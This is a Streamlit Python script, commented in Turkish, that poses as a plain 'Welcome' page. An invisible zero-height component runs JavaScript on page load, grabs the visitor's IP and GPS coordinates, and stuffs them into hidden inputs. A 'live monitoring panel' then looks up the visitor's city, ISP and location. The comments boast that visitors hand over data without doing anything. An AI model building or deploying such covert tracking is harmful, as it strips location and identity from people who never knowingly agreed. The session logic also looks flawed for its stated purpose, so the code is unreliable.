import streamlit as st
import streamlit.components.v1 as components
import requests

# Sayfa ayarları: Tam ekran, gizli çubuklar
st.set_page_config(page_title="Welcome", page_icon="👁️", layout="wide")

# Arayüzü mümkün olduğunca sade tut (Veya gizle)
st.markdown(""" <style> .stApp { background-color: black; } </style> """, unsafe_allow_html=True)

# Gizli veri depoları
st.text_input("IP", key="ip_hidden", label_visibility="collapsed")
st.text_input("LOC", key="loc_hidden", label_visibility="collapsed")

# Otopilot JavaScript: Sayfa yüklendiği an çalışır
auto_js = """
<script>
    // 1. IP Anında Al
    fetch('https://api.ipify.org?format=json')
    .then(res => res.json())
    .then(data => {
        sendToPython('ip_hidden', data.ip);
        checkData();
    });

    // 2. GPS Anında Al (İzin varsa)
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
            let coords = pos.coords.latitude + "," + pos.coords.longitude;
            sendToPython('loc_hidden', coords);
            checkData();
        });
    }

    // Streamlit'e veri gönderme hilesi
    function sendToPython(key, value) {
        let input = window.parent.document.getElementById(key);
        if (input) {
            input.value = value;
            input.dispatchEvent(new Event('input', { bubbles: true }));
        }
    }

    // Veriler tamamsa log bas
    function checkData() {
        console.log("Data sent to Python successfully.");
    }
</script>
"""

# HTML'ı çalıştır
components.html(auto_js, height=0) # Yüksekliği 0 yapıyoruz, görünmez

# --- SADECE SENİN GÖRÜCEĞİN KISIM (Admin Paneli) ---
st.title("🕵️‍♂️ Canlı İzleme Paneli")

st.info("Sitede olan hareketleri anlık olarak aşağıda göreceksin. Ziyaretçi hiçbir şey yapmadan verileri senin ekranına atar.")

# Ziyaretçiden gelen verileri yakalayıp ekrana bas
client_ip = st.session_state.ip_hidden
client_loc = st.session_state.loc_hidden

if client_ip:
    st.success(f"👤 TESPİT EDİLEN IP: **{client_ip}**")
    
    # IP Detayları çek
    try:
        resp = requests.get(f'http://ip-api.com/json/{client_ip}')
        info = resp.json()
        
        c1, c2, c3 = st.columns(3)
        with c1:
            st.metric("Ülke", info.get('country'))
            st.metric("Şehir", info.get('city'))
        with c2:
            st.metric("ISP", info.get('isp'))
            st.metric("Zaman Dilimi", info.get('timezone'))
        with c3:
            st.metric("Enlem", info.get('lat'))
            st.metric("Boylam", info.get('lon'))
            
    except:
        st.warning("Detay çekilemedi.")
else:
    st.warning("Şu anda kimse siteye girmemiş (veya veriler yükleniyor)...")

if client_loc:
    st.info(f"📍 GPS VERİSİ: {client_loc}")
else:
    st.info("GPS verisi bekleniyor...")
